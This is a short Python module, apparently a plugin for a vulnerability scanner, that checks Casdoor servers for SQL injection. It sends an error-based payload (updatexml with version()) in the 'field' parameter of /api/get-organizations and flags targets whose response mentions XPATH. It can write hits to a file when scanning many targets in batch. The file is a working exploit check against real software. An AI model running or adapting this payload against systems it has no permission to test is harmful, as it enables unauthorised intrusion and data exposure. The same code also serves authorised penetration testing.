#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings()
class CasdoorSqlScan:

    def run(self, urls):
        url = urls + '/api/get-organizations?field=updatexml(null,version(),null)&p=123&pageSize=123&sortField&sortOrder&value=cfx'
        try:
            response = requests.get(url, headers=self.headers,verify=self.ssl, timeout=5, proxies=self.proxy)
            if "XPATH" in response.text:
                OutPrintInfoSuc("Casdoor", f'存在Casdoor-SQL漏洞{url}')
                if self.batch:
                    OutPutFile("casdoor_sql.txt",f'存在Casdoor-SQL漏洞{url}')
            else:
                if not self.batch:
                    OutPrintInfo("Casdoor", '不存在Casdoor-SQL漏洞')
        except Exception:
            if not self.batch:
                OutPrintInfo("Casdoor", '目标请求出错')

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("Casdoor", '开始执行Casdoor-SQL漏洞检测')
        self.run(url)
        if not self.batch:
            OutPrintInfo("Casdoor", 'Casdoor-SQL漏洞检测执行结束')
